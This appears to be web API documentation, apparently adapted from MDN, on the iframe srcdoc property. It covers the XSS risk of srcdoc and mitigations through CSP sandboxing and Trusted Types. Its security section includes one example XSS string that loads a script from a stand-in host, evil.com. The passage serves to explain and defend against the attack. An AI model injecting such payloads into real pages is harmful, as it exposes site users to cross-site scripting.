# Fringe Cases

## Warnings & Notes

> [!WARNING]
> This property parses its input as HTML, writing the result into the frame's DOM.
> APIs like this are known as [injection sinks](/en-US/docs/Web/API/Trusted_Types_API#concepts_and_usage), and are potentially a vector for [cross-site scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks, if the input originally came from an attacker.
>
> You can mitigate this risk by always assigning `TrustedHTML` objects instead of strings and [enforcing trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> See [Security considerations](#security_considerations) for more information.

> [!WARNING]
> While you can directly assign a string to `srcdoc`, this is a [security risk](#security_considerations) if the string to be inserted might contain potentially malicious content.
> You should use `TrustedHTML` to ensure that the content is sanitized before it is inserted, and you should set a CSP header to [enforce trusted types](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Exceptions

- `TypeError`
  - : Thrown if the property is set to a string when [Trusted Types](/en-US/docs/Web/API/Trusted_Types_API) are [enforced by a CSP](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) and no default policy is defined.

## Security Notes

The `srcdoc` property allows absolutely any HTML markup to run in a frame by default.
If the frame is not sandboxed using the Content Security Property (CSP) [`sandbox` directive](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) (or is sandboxed but includes the [`allow-same-origin`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) value) then it will be same-origin with the parent.
This means that the frame will have complete access to the parent DOM and resources, and visa versa.

This is a significant vector for [cross-site scripting (XSS)](/en-US/docs/Web/Security/Attacks/XSS) attacks if potentially unsafe strings provided by a user are injected into a frame without first being sanitized.
Consider the following code where a string of HTML from a user might be passed into a frame that is then added to the document.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

If the frame is not expected to need access to your parent document, you can mitigate the risk by using a CSP sandbox without the `allow-same-origin` value.
The frame will then be treated as a cross-origin resource, and attacks will be significantly restricted.
You can also use a more general CSP to restrict the locations from which scripts and other resources are allowed to be fetched.

You can further reduce the risk by always assigning {{domxref("TrustedHTML")}} objects instead of strings, and [enforcing trusted type](/en-US/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) using the [`require-trusted-types-for`](/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for) CSP directive.
This ensures that the input is passed through a transformation function, which has the chance to [sanitize](/en-US/docs/Web/Security/Attacks/XSS#sanitization) the input to remove potentially dangerous markup before it is injected.

